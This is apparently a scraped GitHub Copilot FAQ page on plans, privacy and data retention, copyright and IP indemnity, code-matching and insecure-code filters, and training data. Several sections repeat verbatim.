Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GeneralPlans & PricingPrivacyResponsible AI
### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub.

* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.
